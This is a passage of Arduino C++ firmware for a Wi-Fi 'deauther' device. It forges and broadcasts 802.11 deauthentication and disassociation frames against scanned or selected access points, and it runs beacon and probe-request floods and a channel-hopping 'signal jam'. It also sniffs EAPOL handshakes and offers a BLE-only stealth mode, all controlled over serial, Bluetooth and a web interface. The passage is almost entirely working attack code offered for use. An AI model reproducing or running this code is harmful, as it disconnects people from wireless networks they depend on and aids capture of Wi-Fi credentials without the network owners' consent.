  wifi_tx_raw_frame((void*)&frame, sizeof(DeauthFrame));
}

void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  DisassocFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  // Rotate sequence number (increment by 1 per frame, fragment=0)
  frame.sequence_number = (seq_num_counter++ << 4) & 0xFFF0;
  wifi_tx_raw_frame((void*)&frame, sizeof(DisassocFrame));
}

//==========================================================
// Beacon Flood TX
//==========================================================
void wifi_tx_beacon_frame(const char* ssid, uint8_t ssid_len, uint8_t channel) {
  uint8_t buf[96];
  memset(buf, 0, sizeof(buf));
  int offset = 0;

  buf[offset++] = 0x80; buf[offset++] = 0x00;    // FC = Beacon
  offset += 2;                                    // duration = 0
  memset(&buf[offset], 0xFF, 6); offset += 6;    // DA = broadcast
  randomMAC(&buf[offset]); offset += 6;          // SA = random
  memcpy(&buf[offset], &buf[offset - 6], 6); offset += 6;  // BSSID = SA
  uint16_t seq = (seq_num_counter++ << 4) & 0xFFF0;
  buf[offset++] = seq & 0xFF; buf[offset++] = (seq >> 8) & 0xFF;

  unsigned long ts = millis();
  memcpy(&buf[offset], &ts, 4); offset += 8;      // timestamp (low 4B, high 4B zero)
  buf[offset++] = 0x64; buf[offset++] = 0x00;    // beacon interval = 100 TUs
  buf[offset++] = 0x01; buf[offset++] = 0x00;    // capability = ESS

  buf[offset++] = 0x00;                           // SSID tag
  buf[offset++] = ssid_len;
  memcpy(&buf[offset], ssid, ssid_len); offset += ssid_len;
  buf[offset++] = 0x03; buf[offset++] = 0x01; buf[offset++] = channel;  // DS params
  if (channel >= 36) {
    // 5GHz 802.11a/n OFDM Supported Rates (6, 9, 12, 18, 24, 36, 48, 54 Mbps)
    const uint8_t rates5g[] = {0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C};
    buf[offset++] = 0x01; buf[offset++] = sizeof(rates5g);
    memcpy(&buf[offset], rates5g, sizeof(rates5g));
    offset += sizeof(rates5g);
  } else {
    // 2.4GHz 802.11b/g Supported Rates (1, 2, 5.5, 11 Mbps)
    buf[offset++] = 0x01; buf[offset++] = 0x04;
    buf[offset++] = 0x82; buf[offset++] = 0x84;
    buf[offset++] = 0x8B; buf[offset++] = 0x96;
  }

  wifi_tx_raw_frame(buf, offset);
}

//==========================================================
// Probe Request Flood TX
//==========================================================
void wifi_tx_probe_req_frame(const char* ssid, uint8_t ssid_len) {
  uint8_t buf[96];
  memset(buf, 0, sizeof(buf));
  int offset = 0;

  buf[offset++] = 0x40; buf[offset++] = 0x00;    // FC = Probe Request
  offset += 2;                                    // duration = 0
  memset(&buf[offset], 0xFF, 6); offset += 6;    // DA = broadcast
  randomMAC(&buf[offset]); offset += 6;          // SA = random
  memset(&buf[offset], 0xFF, 6); offset += 6;    // BSSID = broadcast
  uint16_t seq = (seq_num_counter++ << 4) & 0xFFF0;
  buf[offset++] = seq & 0xFF; buf[offset++] = (seq >> 8) & 0xFF;

  buf[offset++] = 0x00;                           // SSID tag
  buf[offset++] = ssid_len;
  memcpy(&buf[offset], ssid, ssid_len); offset += ssid_len;
  if (currentChannel >= 36) {
    const uint8_t rates5g[] = {0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C};
    buf[offset++] = 0x01; buf[offset++] = sizeof(rates5g);
    memcpy(&buf[offset], rates5g, sizeof(rates5g));
    offset += sizeof(rates5g);
  } else {
    buf[offset++] = 0x01; buf[offset++] = 0x04;
    buf[offset++] = 0x82; buf[offset++] = 0x84;
    buf[offset++] = 0x8B; buf[offset++] = 0x96;
  }

  wifi_tx_raw_frame(buf, offset);
}

//==========================================================
// Sorting Helper
//==========================================================
void sortByChannel(std::vector<WiFiScanResult> &results) {
  for (size_t i = 0; i < results.size(); i++) {
    size_t min_idx = i;
    for (size_t j = i + 1; j < results.size(); j++) {
      if (results[j].channel < results[min_idx].channel) {
        min_idx = j;
      }
    }
    if (min_idx != i) {
      WiFiScanResult temp = results[i];
      results[i] = results[min_idx];
      results[min_idx] = temp;
    }
  }
}

//==========================================================
// Wi-Fi Scan Callback
//==========================================================
volatile bool scan_done = false;
volatile bool scan_accepting = false;  // 扫描期间才允许驱动线程写入 scan_results

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (!scan_accepting) return RTW_SUCCESS;
  if (scan_result->scan_complete == 0) {
    rtw_scan_result_t *record = &scan_result->ap_details;
    uint8_t ssidLen = (record->SSID.len > 32) ? 32 : record->SSID.len;
    record->SSID.val[ssidLen] = 0;

    if (record->channel >= start_channel) {
      WiFiScanResult result;
      result.ssid = String((const char*) record->SSID.val);
      result.channel = record->channel;
      result.rssi = record->signal_strength;
      memcpy(&result.bssid, &record->BSSID, 6);

      char bssid_str[20];
      snprintf(bssid_str, sizeof(bssid_str),
               "%02X:%02X:%02X:%02X:%02X:%02X",
               result.bssid[0], result.bssid[1], result.bssid[2],
               result.bssid[3], result.bssid[4], result.bssid[5]);
      result.bssid_str = bssid_str;
      scan_results.push_back(result);
    }
  } else {
    scan_accepting = false;
    scan_done = true;
  }
  return RTW_SUCCESS;
}

//==========================================================
// Start a WiFi Scan
//==========================================================
int scanNetworks() {
  Serial.println("Starting WiFi scan...");
  scan_results.clear();
  scan_done = false;
  scan_accepting = true;
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    if (USE_LED) digitalWrite(LED_G, HIGH);
    // Wait for the driver to signal scan completion, using scan_time only as
    // a maximum-timeout guard so we never block forever.
    unsigned long start = millis();
    while (!scan_done && (millis() - start < scan_time)) {
      delay(50);
    }
    // 无论完成还是超时，立即切断驱动线程对 scan_results 的后续写入，
    // 避免跨线程 std::vector 扩容与主线程读写并发导致 HardFault
    scan_accepting = false;
    delay(10);
    Serial.println("Scan completed!");
    sortByChannel(scan_results);
    // 若在周期重扫模式下已有锁定目标，按 BSSID 同步最新信道与选中态
    if (target_mode && !target_aps.empty()) {
      for (size_t t = 0; t < target_aps.size(); t++) {
        for (size_t i = 0; i < scan_results.size(); i++) {
          if (memcmp(scan_results[i].bssid, target_aps[t].bssid, 6) == 0) {
            scan_results[i].selected = true;
            target_aps[t].channel = scan_results[i].channel;
            target_aps[t].rssi = scan_results[i].rssi;
            break;
          }
        }
      }
    }
    blePushScanResults();
    if (USE_LED) digitalWrite(LED_G, LOW);
    return 0;
  } else {
    scan_accepting = false;
    Serial.println("Failed to start the scan!");
    return 1;
  }
}

void printScanResults() {
  Serial.println("Detected networks:");
  for (size_t i = 0; i < scan_results.size(); i++) {
    String freq = (scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz";
    Serial.print(i);
    Serial.print("\tSSID: ");
    Serial.print(scan_results[i].ssid);
    Serial.print("\tBSSID: ");
    Serial.print(scan_results[i].bssid_str);
    Serial.print("\tChannel: ");
    Serial.print(scan_results[i].channel);
    Serial.print("\tRSSI: ");
    Serial.print(scan_results[i].rssi);
    Serial.print(" dBm\t");
    Serial.println(freq);
  }
}

//==========================================================
// Timed Attack
//==========================================================
void startTimedAttack(unsigned long durationMs) {
  timedAttackEnabled = true;
  attackStartTime    = millis();
  attackDuration     = durationMs;
  attack_enabled     = true;
}

void checkTimedAttack() {
  if (timedAttackEnabled && (millis() - attackStartTime > attackDuration)) {
    attack_enabled     = false;
    timedAttackEnabled = false;
    blePushStatus();
    Serial.println("[INFO] Timed attack ended.");
  }
}

//==========================================================
// JSON Builders
//==========================================================
String jsonEscape(const String &s) {
  String out = "";
  for (size_t i = 0; i < s.length(); i++) {
    char c = s[i];
    if (c == '"') out += "\\\"";
    else if (c == '\\') out += "\\\\";
    else if (c == '\n') out += "\\n";
    else if (c == '\r') out += "\\r";
    else if (c == '\t') out += "\\t";
    else if (c >= 0 && c < 32) {
      char buf[8];
      snprintf(buf, sizeof(buf), "\\u%04x", c);
      out += buf;
    } else {
      out += c;
    }
  }
  return out;
}

String getScanResultsJSON() {
  String json = "{\"count\":" + String(scan_results.size()) + ",\"networks\":[";
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (i) json += ",";
    json += "{";
    json += "\"index\":" + String(i) + ",";
    json += "\"ssid\":\"" + jsonEscape(scan_results[i].ssid) + "\",";
    json += "\"bssid\":\"" + scan_results[i].bssid_str + "\",";
    json += "\"channel\":" + String(scan_results[i].channel) + ",";
    json += "\"rssi\":" + String(scan_results[i].rssi) + ",";
    json += "\"band\":\"" + String((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "\",";
    json += "\"selected\":" + String(scan_results[i].selected ? "true" : "false");
    json += "}";
  }
  json += "]}";
  return json;
}

String getStatusJSON() {
  String json = "{";
  json += "\"attack_enabled\":" + String(attack_enabled ? "true" : "false") + ",";
  json += "\"disassoc_enabled\":" + String(disassoc_enabled ? "true" : "false") + ",";
  json += "\"timed_attack\":" + String(timedAttackEnabled ? "true" : "false") + ",";
  json += "\"sniffing\":" + String(isSniffing ? "true" : "false") + ",";
  json += "\"hopping\":" + String(isHopping ? "true" : "false") + ",";
  json += "\"target_mode\":" + String(target_mode ? "true" : "false") + ",";
  json += "\"scan_count\":" + String(scan_results.size()) + ",";
  json += "\"target_count\":" + String(target_aps.size()) + ",";
  json += "\"current_channel\":" + String(currentChannel) + ",";
  json += "\"beacon_flood\":" + String(beacon_flood_enabled ? "true" : "false") + ",";
  json += "\"probe_flood\":" + String(probe_flood_enabled ? "true" : "false") + ",";
  json += "\"signal_jam\":" + String(signal_jam_enabled ? "true" : "false") + ",";
  json += "\"deauth_sniff\":" + String(deauth_sniff_enabled ? "true" : "false") + ",";
  json += "\"tx_ok\":" + String(tx_success_count) + ",";
  json += "\"tx_fail\":" + String(tx_fail_count) + ",";
  if (timedAttackEnabled) {
    unsigned long remaining = (attackDuration > (millis() - attackStartTime))
      ? (attackDuration - (millis() - attackStartTime)) : 0;
    json += "\"timed_remaining\":" + String(remaining) + ",";
  }
  json += "\"uptime\":" + String(millis());
  json += "}";
  return json;
}

String getInfoJSON() {
  String json = "{";
  json += "\"cycle_delay\":" + String(cycle_delay) + ",";
  json += "\"scan_time\":" + String(scan_time) + ",";
  json += "\"num_frames\":" + String(num_send_frames) + ",";
  json += "\"start_channel\":" + String(start_channel) + ",";
  json += "\"scan_between_cycles\":" + String(scan_between_cycles ? "true" : "false") + ",";
  json += "\"led\":" + String(USE_LED ? "true" : "false") + ",";
  json += "\"ssid\":\"" + jsonEscape(String(ap_ssid)) + "\",";
  json += "\"pass\":\"" + jsonEscape(String(ap_pass)) + "\",";
  json += "\"ble_name\":\"" + jsonEscape(String(ble_name)) + "\",";
  json += "\"channel\":" + String(WIFI_CHANNEL);
  json += "}";
  return json;
}

//==========================================================
// HTTP Helpers
//==========================================================
String httpHeader(int code, const String &contentType, int contentLength = -1) {
  String reason = (code == 200) ? "OK" : (code == 400) ? "Bad Request" : (code == 404) ? "Not Found" : "OK";
  String h = "HTTP/1.1 " + String(code) + " " + reason + "\r\n";
  h += "Content-Type: " + contentType + "\r\n";
  h += "Access-Control-Allow-Origin: *\r\n";
  if (contentLength >= 0) {
    h += "Content-Length: " + String(contentLength) + "\r\n";
  }
  h += "Connection: close\r\n\r\n";
  return h;
}

void sendLargeText(WiFiClient &client, const char *data, size_t totalLen) {
  const size_t CHUNK_SIZE = 1024;
  size_t sent = 0;
  while (sent < totalLen && client.connected()) {
    size_t toSend = (totalLen - sent > CHUNK_SIZE) ? CHUNK_SIZE : (totalLen - sent);
    client.write((const uint8_t *)data + sent, toSend);
    sent += toSend;
    delay(2);  // give lwIP time to drain its send window
  }
}

String parsePath(const String &request) {
  int start = request.indexOf(' ');
  if (start < 0) return "/";
  start++;
  int end = request.indexOf(' ', start);
  if (end < 0) return "/";
  return request.substring(start, end);
}

String parseMethod(const String &request) {
  int end = request.indexOf(' ');
  if (end < 0) return "GET";
  return request.substring(0, end);
}

String parseBody(const String &request) {
  int idx = request.indexOf("\r\n\r\n");
  if (idx < 0) return "";
  return request.substring(idx + 4);
}

String urlDecode(const String &s) {
  String out = "";
  for (size_t i = 0; i < s.length(); i++) {
    char c = s[i];
    if (c == '+') out += ' ';
    else if (c == '%' && i + 2 < s.length()) {
      char hex[3] = {s[i+1], s[i+2], 0};
      out += (char)strtol(hex, nullptr, 16);
      i += 2;
    } else {
      out += c;
    }
  }
  return out;
}

String getQueryParam(const String &path, const String &key) {
  int q = path.indexOf('?');
  if (q < 0) return "";
  String query = path.substring(q + 1);
  String prefix = key + "=";
  int start = -1;
  for (int from = 0; from < (int)query.length(); ) {
    int pos = query.indexOf(prefix, from);
    if (pos < 0) break;
    // Accept the key only at the start or right after a '&', so that e.g.
    // "led" does not match inside "use_led".
    if (pos == 0 || query.charAt(pos - 1) == '&') {
      start = pos;
      break;
    }
    from = pos + 1;
  }
  if (start < 0) return "";
  start += prefix.length();
  int end = query.indexOf('&', start);
  if (end < 0) end = query.length();
  return urlDecode(query.substring(start, end));
}

String getPostValue(const String &body, const String &key) {
  String prefix = key + "=";
  int start = -1;
  for (int from = 0; from < (int)body.length(); ) {
    int pos = body.indexOf(prefix, from);
    if (pos < 0) break;
    if (pos == 0 || body.charAt(pos - 1) == '&') {
      start = pos;
      break;
    }
    from = pos + 1;
  }
  if (start < 0) return "";
  start += prefix.length();
  int end = body.indexOf('&', start);
  if (end < 0) end = body.length();
  return urlDecode(body.substring(start, end));
}

//==========================================================
// Handle Incoming Commands
//==========================================================
void handleCommand(String command) {
  command.trim();

  if (command.equalsIgnoreCase("ap off")) {
    if (isSniffing) {
      wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
      isSniffing = false;
      currentMode = SNIFF_STOP;
    }
    webServer.end();
    wifi_off();
    delay(20);
    wifi_on(RTW_MODE_STA);
    apEnabled = false;
    blePushInfo();
    blePushStatus();
    Serial.println("[INFO] AP + WebUI disabled. BLE-only stealth mode (STA active).");
  }
  else if (command.equalsIgnoreCase("ap on")) {
    if (isSniffing) {
      wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
      isSniffing = false;
      currentMode = SNIFF_STOP;
    }
    startSoftAP();
    blePushInfo();
    blePushStatus();
    Serial.println("[INFO] AP + WebUI re-enabled.");
  }
  else if (command.equalsIgnoreCase("start deauther")) {
    if (isSniffing) { stopSniffing(); }
    attack_enabled = true;
    blePushStatus();
    Serial.println("[INFO] Deauthentication Attack started.");
  }
  else if (command.equalsIgnoreCase("stop deauther") || command.equalsIgnoreCase("stop") || command.equalsIgnoreCase("stop all")) {
    // Universal stop: kill every attack and restore the soft AP (if apEnabled)
    attack_enabled = false;
    disassoc_enabled = false;
    timedAttackEnabled = false;
    scan_enabled = false;
    beacon_flood_enabled = false;
    probe_flood_enabled = false;
    signal_jam_enabled = false;
    deauth_sniff_enabled = false;
    has_sniffed_deauth = false;
    if (isSniffing) { stopSniffing(); }  // restores AP or STA based on apEnabled
    wifi_set_channel(WIFI_CHANNEL);       // restore default channel
    currentChannel = WIFI_CHANNEL;
    if (USE_LED) digitalWrite(LED_B, LOW);
    blePushStatus();
    Serial.println("[INFO] All attacks stopped.");
  }
  else if (command.equalsIgnoreCase("scan")) {
    if (isSniffing) { stopSniffing(); }
    target_aps.clear();
    target_mode = false;
    scan_enabled = true;
    Serial.println("[INFO] Starting scan...");
    if (scanNetworks() == 0) {
      printScanResults();
      scan_enabled = false;
      Serial.println("[INFO] Scan completed.");
    }
    else {
      scan_enabled = false;
      Serial.println("[ERROR] Scan failed.");
    }
  }
  else if (command.equalsIgnoreCase("results")) {
    if (!scan_results.empty()) {
      printScanResults();
      blePushScanResults();
    }
    else {
      Serial.println("[INFO] No scan results available. Try 'scan' first.");
    }
  }
  else if (command.startsWith("attack_time ")) {
    String valStr = command.substring(String("attack_time ").length());
    unsigned long durationMs = valStr.toInt();
    if (durationMs > 0) {
      if (isSniffing) { stopSniffing(); }
      startTimedAttack(durationMs);
      blePushStatus();
      Serial.println("[INFO] Timed attack started for " + String(durationMs) + " ms.");
    }
  }
  else if (command.equalsIgnoreCase("disassoc")) {
    if (!disassoc_enabled) {
      if (isSniffing) { stopSniffing(); }
      disassoc_enabled = true;
      blePushStatus();
      Serial.println("[INFO] Continuous Disassociation Attack started.");
    }
  }
  else if (command.equalsIgnoreCase("random_attack")) {
    if (!scan_results.empty()) {
      if (isSniffing) { stopSniffing(); }
      size_t idx = random(0, scan_results.size());
      uint8_t randChannel = scan_results[idx].channel;
      if (wifi_set_channel(randChannel) != 0) {
        Serial.print("[WARN] wifi_set_channel(");
        Serial.print(randChannel);
        Serial.println(") failed");
      } else {
        currentChannel = randChannel;
      }
      for (unsigned long j = 0; j < num_send_frames; j++) {
        uint16_t reason = deauth_reasons[j % num_deauth_reasons];
        wifi_tx_deauth_frame(scan_results[idx].bssid, dst_mac, reason);
        wifi_tx_disassoc_frame(scan_results[idx].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
        delay(1);
      }
      if (apEnabled) {
        wifi_set_channel(WIFI_CHANNEL);
        currentChannel = WIFI_CHANNEL;
      }
      blePushStatus();
      Serial.print("[RANDOM ATTACK] => ");
      Serial.print(scan_results[idx].ssid);
      Serial.print(" on channel ");
      Serial.println(randChannel);
    }
  }
  //==========================
  // Flood / Jam / Sniff-clone attacks (merged from upstream v1.0.3)
  //==========================
  else if (command.equalsIgnoreCase("beacon_flood") || command.equalsIgnoreCase("beacon flood")) {
    if (beacon_flood_enabled) {
      beacon_flood_enabled = false;
      Serial.println("[INFO] Beacon flood stopped.");
    } else {
      if (isSniffing) { stopSniffing(); }
      beacon_flood_enabled = true;
      beacon_flood_count = 0;
      Serial.println("[INFO] Beacon flood started.");
    }
    blePushStatus();
  }
  else if (command.equalsIgnoreCase("probe_flood") || command.equalsIgnoreCase("probe flood")) {
    if (probe_flood_enabled) {
      probe_flood_enabled = false;
      Serial.println("[INFO] Probe flood stopped.");
    } else {
      if (isSniffing) { stopSniffing(); }
      probe_flood_enabled = true;
      probe_flood_count = 0;
      Serial.println("[INFO] Probe flood started.");
    }
    blePushStatus();
  }
  else if (command.equalsIgnoreCase("signal_jam") || command.equalsIgnoreCase("signal jam")) {
    if (signal_jam_enabled) {
      signal_jam_enabled = false;
      wifi_set_channel(WIFI_CHANNEL);
      currentChannel = WIFI_CHANNEL;
      if (USE_LED) digitalWrite(LED_B, LOW);
      Serial.println("[INFO] Signal jam stopped.");
    } else {
      if (isSniffing) { stopSniffing(); }
      signal_jam_enabled = true;
      signal_jam_count = 0;
      signal_jam_ch_index = 0;
      Serial.println("[INFO] Signal jam started - rapid channel cycling + deauth.");
    }
    blePushStatus();
  }
  else if (command.equalsIgnoreCase("deauth_sniff") || command.equalsIgnoreCase("deauth sniff")) {
    if (deauth_sniff_enabled) {
      deauth_sniff_enabled = false;
      has_sniffed_deauth = false;
      stopSniffing();  // exit promisc, restore AP or STA
      Serial.println("[INFO] Deauth sniff stopped.");
    } else {
      currentMode = SNIFF_DEAUTH;
      startSniffing();
      deauth_sniff_enabled = true;
      has_sniffed_deauth = false;
      Serial.println("[INFO] Deauth sniff started - listening for deauth frames to clone.");
    }
    blePushStatus();
  }
  else if (command.startsWith("single_ap") || command.startsWith("single ap")) {
    if (scan_results.empty()) {
      Serial.println("[ERROR] No scan results. Run 'scan' first.");
    } else {
      String idxStr = command.substring(command.indexOf(' ') + 1);
      idxStr.trim();
      int idx = idxStr.toInt();
      if (idx < 0 || idx >= (int)scan_results.size()) idx = 0;
      if (isSniffing) { stopSniffing(); }
      wifi_set_channel(scan_results[idx].channel);
      currentChannel = scan_results[idx].channel;
      for (unsigned long j = 0; j < num_send_frames; j++) {
        wifi_tx_deauth_frame(scan_results[idx].bssid, dst_mac, deauth_reasons[j % num_deauth_reasons]);
        wifi_tx_disassoc_frame(scan_results[idx].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
        delay(1);
      }
      if (apEnabled) {
        wifi_set_channel(WIFI_CHANNEL);
        currentChannel = WIFI_CHANNEL;
      }
      Serial.print("[SINGLE AP] Attacked ");
      Serial.print(scan_results[idx].ssid);
      Serial.print(" on ch ");
      Serial.println(scan_results[idx].channel);
      blePushStatus();
    }
  }
  else if (command.equalsIgnoreCase("tx_stats")) {
    Serial.println("TX Stats: " + String(tx_success_count) + " OK / " + String(tx_fail_count) + " FAIL");
  }
  else if (command.equalsIgnoreCase("reset_txstats")) {
    tx_success_count = 0;
    tx_fail_count = 0;
    seq_num_counter = 1;
    blePushStatus();
    Serial.println("[TX STATS] Reset.");
  }
  else if (command == "start sniff") {
    deauth_sniff_enabled = false;
    has_sniffed_deauth = false;
    currentMode = SNIFF_ALL;
    startSniffing();
    blePushStatus();
  }
  else if (command == "hop on") {
    // 仅开启跳频标志；真正的跳频在 loop() 的 if (isSniffing) 分支里执行。
    // 不在非嗅探态偷开混杂模式，避免关掉 SoftAP 导致热点死锁。
    isHopping = true;
    blePushStatus();
  }
  else if (command == "hop off") {
    isHopping = false;
    blePushStatus();
  }
  else if (command.startsWith("set ch ")) {
    String chStr = command.substring(7);
    chStr.trim();
    int newChannel = chStr.toInt();
    bool validChannel = false;
    for (int ch : CHANNELS_2GHZ) { if (ch == newChannel) validChannel = true; }
    for (int ch : CHANNELS_5GHZ) { if (ch == newChannel) validChannel = true; }
    if (validChannel) {
      isHopping = false;
      useCustomChannels = false;
      setChannel(newChannel);
      blePushStatus();
    }
  }
  else if (command == "sniff beacon") { deauth_sniff_enabled = false; has_sniffed_deauth = false; currentMode = SNIFF_BEACON; startSniffing(); blePushStatus(); }
  else if (command == "sniff probe") { deauth_sniff_enabled = false; has_sniffed_deauth = false; currentMode = SNIFF_PROBE; startSniffing(); blePushStatus(); }
  else if (command == "sniff deauth") { deauth_sniff_enabled = false; has_sniffed_deauth = false; currentMode = SNIFF_DEAUTH; startSniffing(); blePushStatus(); }
  else if (command == "sniff eapol") { deauth_sniff_enabled = false; has_sniffed_deauth = false; currentMode = SNIFF_EAPOL; startSniffing(); blePushStatus(); }
  else if (command == "sniff pwnagotchi") { deauth_sniff_enabled = false; has_sniffed_deauth = false; currentMode = SNIFF_PWNAGOTCHI; startSniffing(); blePushStatus(); }
  else if (command == "sniff all") { deauth_sniff_enabled = false; has_sniffed_deauth = false; currentMode = SNIFF_ALL; startSniffing(); blePushStatus(); }
  else if (command == "stop sniff") { stopSniffing(); blePushStatus(); }
  else if (command.startsWith("set ")) {
    String setting = command.substring(4);
    setting.trim();
    int space_index = setting.indexOf(' ');
    if (space_index != -1) {
      String key = setting.substring(0, space_index);
      String rawValue = setting.substring(space_index + 1);
      rawValue.trim();
      String value = rawValue;
      value.replace(" ", "");

      if (key.equalsIgnoreCase("cycle_delay")) {
        cycle_delay = value.toInt();
        saveConfigToFlash();
        blePushInfo();
      }
      else if (key.equalsIgnoreCase("scan_time")) {
        scan_time = value.toInt();
        saveConfigToFlash();
        blePushInfo();
      }
      else if (key.equalsIgnoreCase("num_frames")) {
        num_send_frames = value.toInt();
        saveConfigToFlash();
        blePushInfo();
      }
      else if (key.equalsIgnoreCase("start_channel")) {
        start_channel = value.toInt();
        saveConfigToFlash();
        blePushInfo();
      }
      else if (key.equalsIgnoreCase("scan_cycles")) {
        scan_between_cycles = value.equalsIgnoreCase("on");
        saveConfigToFlash();
        blePushInfo();
      }
      else if (key.equalsIgnoreCase("led")) {
        USE_LED = value.equalsIgnoreCase("on");
        if (!USE_LED) {
          digitalWrite(LED_R, LOW);
          digitalWrite(LED_G, LOW);
          digitalWrite(LED_B, LOW);
        }
        saveConfigToFlash();
        blePushInfo();
      }
      else if (key.equalsIgnoreCase("ap_ssid")) {
        if (rawValue.length() >= 1 && rawValue.length() <= 32) {
          if (String(ap_ssid) != rawValue) {
            strncpy(ap_ssid, rawValue.c_str(), sizeof(ap_ssid) - 1);
            ap_ssid[sizeof(ap_ssid) - 1] = '\0';
            saveConfigToFlash();
            if (apEnabled && !isSniffing) pendingApRestart = true;
          }
          blePushInfo();
          Serial.println("[CFG] AP SSID updated to: " + String(ap_ssid));
        } else {
          Serial.println("[ERROR] AP SSID must be 1..32 bytes");
        }
      }
      else if (key.equalsIgnoreCase("ap_pass")) {
        if (rawValue.length() >= 8 && rawValue.length() <= 63) {
          if (String(ap_pass) != rawValue) {
            strncpy(ap_pass, rawValue.c_str(), sizeof(ap_pass) - 1);
            ap_pass[sizeof(ap_pass) - 1] = '\0';
            saveConfigToFlash();
            if (apEnabled && !isSniffing) pendingApRestart = true;
          }
          blePushInfo();
          Serial.println("[CFG] AP password updated.");
        } else {
          Serial.println("[ERROR] AP password must be 8..63 chars (WPA2)");
        }
      }
      else if (key.equalsIgnoreCase("ble_name")) {
        if (rawValue.length() >= 1 && rawValue.length() <= 26) {
          updateBleName(rawValue.c_str());
          saveConfigToFlash();
          blePushInfo();
          Serial.println("[CFG] BLE name updated to: " + String(ble_name));
        } else {
          Serial.println("[ERROR] BLE name must be 1..26 bytes");
        }
      }
      else if (key.equalsIgnoreCase("target")) {
        target_aps.clear();
        target_mode = false;
        for (size_t i = 0; i < scan_results.size(); i++) {
          scan_results[i].selected = false;
        }
        if (value.equalsIgnoreCase("all")) {
          for (size_t i = 0; i < scan_results.size(); i++) {
            scan_results[i].selected = true;
            target_aps.push_back(scan_results[i]);
          }
          if (!target_aps.empty()) target_mode = true;
        } else {
          int start = 0;
          int end = 0;
          while ((end = value.indexOf(',', start)) != -1) {
            int target_index = value.substring(start, end).toInt();
            if (target_index >= 0 && target_index < (int)scan_results.size()) {
              scan_results[target_index].selected = true;
              target_aps.push_back(scan_results[target_index]);
            }
            start = end + 1;
          }
          if (start < (int)value.length()) {
            int target_index = value.substring(start).toInt();
            if (target_index >= 0 && target_index < (int)scan_results.size()) {
              scan_results[target_index].selected = true;
              target_aps.push_back(scan_results[target_index]);
            }
          }
          if (!target_aps.empty()) target_mode = true;
        }
      }
    }
    else if (setting.equalsIgnoreCase("target")) {
      // "set target" with no value -> clear targets, fall back to full mode.
      target_aps.clear();
      target_mode = false;
      for (size_t i = 0; i < scan_results.size(); i++) {
        scan_results[i].selected = false;
      }
    }
  }
  else if (command.equalsIgnoreCase("reset_config")) {
    strcpy(ap_ssid, DEFAULT_WIFI_SSID);
    strcpy(ap_pass, DEFAULT_WIFI_PASS);
    updateBleName(DEFAULT_BLE_NAME);
    cycle_delay = 2000;
    scan_time = 5000;
    num_send_frames = 3;
    start_channel = 1;
    scan_between_cycles = false;
    USE_LED = true;
    saveConfigToFlash();
    blePushInfo();
    if (apEnabled && !isSniffing) pendingApRestart = true;
    Serial.println("[CFG] Restored factory default configuration.");
  }
  else if (command.equalsIgnoreCase("info")) {
    Serial.println("[INFO] SSID=" + String(ap_ssid) + " BLE=" + String(ble_name) + " cycle_delay=" + String(cycle_delay) + " scan_time=" + String(scan_time) + " frames=" + String(num_send_frames));
    blePushInfo();
  }
  else if (command.equalsIgnoreCase("help")) {
    Serial.println("Commands: scan, results, start deauther, stop, disassoc, random_attack, attack_time <ms>");
    Serial.println("Sniffer: start sniff, sniff beacon/probe/deauth/eapol/pwnagotchi/all, stop sniff, hop on/off");
    Serial.println("Config: set ap_ssid/ap_pass/ble_name/cycle_delay/scan_time/num_frames/start_channel/scan_cycles/led/target <val>, reset_config");
    Serial.println("Web: connect to WiFi '" + String(ap_ssid) + "' and open 192.168.1.1 in browser");
  }
  else {
    Serial.println("[ERROR] Unknown command: " + command);
  }
}

//==========================================================
// Attack Functions
//==========================================================
void targetAttack() {
  if (target_mode && attack_enabled) {
    if (USE_LED) digitalWrite(LED_B, HIGH);
    for (size_t i = 0; i < target_aps.size(); i++) {
      if (wifi_set_channel(target_aps[i].channel) != 0) {
        Serial.print("[WARN] wifi_set_channel(");
        Serial.print(target_aps[i].channel);
        Serial.println(") failed");
        continue;
      }
      currentChannel = target_aps[i].channel;
      for (unsigned long j = 0; j < num_send_frames; j++) {
        uint16_t reason = deauth_reasons[j % num_deauth_reasons];
        // 仅发 AP -> Broadcast 的有效帧；src==dst(BSSID->BSSID) 会被 AP 硬件当作回环丢弃，
        // 徒耗 50% 空口时间
        wifi_tx_deauth_frame(target_aps[i].bssid, dst_mac, reason);
        wifi_tx_disassoc_frame(target_aps[i].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
        delay(1);
      }
    }
    // 仅在 WebUI SoftAP 开启时回切至热点信道以维持网页连接
    if (apEnabled) {
      wifi_set_channel(WIFI_CHANNEL);
    }
    if (USE_LED) digitalWrite(LED_B, LOW);
  }
}

void generalAttack() {
  if (!target_mode && attack_enabled) {
    attackCycle();
  }
}

void attackCycle() {
  uint8_t currentCh = 0xFF;
  if (USE_LED) digitalWrite(LED_B, HIGH);
  for (size_t i = 0; i < scan_results.size(); i++) {
    uint8_t targetChannel = scan_results[i].channel;
    if (targetChannel != currentCh) {
      if (wifi_set_channel(targetChannel) != 0) {
        Serial.print("[WARN] wifi_set_channel(");
        Serial.print(targetChannel);
        Serial.println(") failed");
        continue;
      }
      currentCh = targetChannel;
      currentChannel = targetChannel;
    }
    for (unsigned long j = 0; j < num_send_frames; j++) {
      uint16_t reason = deauth_reasons[j % num_deauth_reasons];
      // 仅发 AP -> Broadcast 的有效帧
      wifi_tx_deauth_frame(scan_results[i].bssid, dst_mac, reason);
      wifi_tx_disassoc_frame(scan_results[i].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
      delay(1);
    }
  }
  if (apEnabled) {
    wifi_set_channel(WIFI_CHANNEL);
  }
  if (USE_LED) digitalWrite(LED_B, LOW);
  Serial.println("Attack cycle completed.");
}

//==========================================================
// Web Client Handler
//==========================================================
void handleWebClient() {
